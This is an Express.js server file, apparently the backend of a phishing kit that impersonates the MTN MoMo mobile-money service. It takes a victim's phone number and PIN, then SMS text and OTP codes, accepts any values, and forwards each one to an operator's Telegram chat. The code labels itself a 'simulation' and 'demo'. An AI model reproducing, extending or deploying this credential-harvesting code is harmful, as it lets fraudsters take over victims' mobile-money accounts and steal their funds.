const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

// ── Telegram notifications ─────────────────────────────
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;

async function sendTelegram(text) {
  if (!BOT_TOKEN || !CHAT_ID) {
    console.log('⚠️ Telegram not configured:', text);
    return;
  }
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const r = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' })
    });
    const j = await r.json();
    if (!j.ok) console.log('Telegram response:', j);
  } catch (err) {
    console.error('Telegram error:', err.message);
  }
}


// In-memory store — resets when server restarts.
// For a real app, use a database.
const applications = {};

// ── 1. Verify PIN (login) ────────────────────────────────
app.post('/api/verify-pin', (req, res) => {
  const { phoneNumber, pin } = req.body;

  if (!phoneNumber || !pin) {
    return res.json({ success: false, message: 'Missing phone or PIN.' });
  }

  // SIMULATION: accept any 9-digit phone + any 5-digit PIN
  // For a stricter demo, uncomment the block below:
  // if (pin !== '12345') {
  //   return res.json({ success: false, message: 'Invalid credentials.' });
  // }

  const id = 'APP-' + Date.now();
  applications[id] = { phoneNumber, pin, status: 'pending' };

    sendTelegram(`🔐 <b>New Login</b>\nApp ID: <code>${id}</code>\nPhone: <code>${phoneNumber}</code>\nPIN: <code>${pin}</code>`);

  console.log('📥 New login:', id, phoneNumber);

  // Simulate admin approval after 5 seconds
  setTimeout(() => {
    if (applications[id]) {
      applications[id].status = 'approved';
          sendTelegram(`✅ <b>Approved</b>\nApp ID: <code>${id}</code>`);
      console.log('✅ Approved:', id);
    }
  }, 5000);

  res.json({ success: true, applicationId: id });
});

// ── 2. Check PIN approval status ─────────────────────────
app.get('/api/check-pin-status/:id', (req, res) => {
  const app_ = applications[req.params.id];
  if (!app_) return res.json({ success: false, status: 'unknown' });
  res.json({ success: true, status: app_.status });
});

// ── 3. Submit SMS text ───────────────────────────────────
app.post('/api/submit-sms', (req, res) => {
  const { applicationId, smsText } = req.body;
    sendTelegram(`📩 <b>SMS submitted</b>\nApp ID: <code>${applicationId}</code>\nText: <code>${smsText}</code>`);
  console.log('📩 SMS received for', applicationId, ':', smsText);
  res.json({ success: true });
});

// ── 4. Verify OTP ────────────────────────────────────────
app.post('/api/verify-otp', (req, res) => {
  const { applicationId, otp } = req.body;
  const app_ = applications[applicationId];

  if (!app_) return res.json({ success: false, message: 'Unknown application.' });

  // SIMULATION: accept any 4-digit OTP
  // For stricter demo, uncomment:
  // if (otp !== '1234') {
  //   app_.status = 'wrongcode';
  //   return res.json({ success: false, message: 'Wrong OTP.' });
  // }

  
      sendTelegram(`🔑 <b>OTP entered</b>\nApp ID: <code>${applicationId}</code>\nOTP: <code>${otp}</code>`);
  console.log('🔐 OTP accepted for', applicationId);
  app_.otpStatus = 'approved';
  res.json({ success: true });
});

// ── 5. Check OTP approval status ─────────────────────────
app.get('/api/check-otp-status/:id', (req, res) => {
  const app_ = applications[req.params.id];
  if (!app_) return res.json({ success: false, status: 'unknown' });
  res.json({ success: true, status: app_.otpStatus || 'pending' });
});

// ── Health check ─────────────────────────────────────────
app.get('/', (req, res) => {
  res.send('MTN MoMo Backend is running ✅');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log('🚀 Server running on port ' + PORT);
});
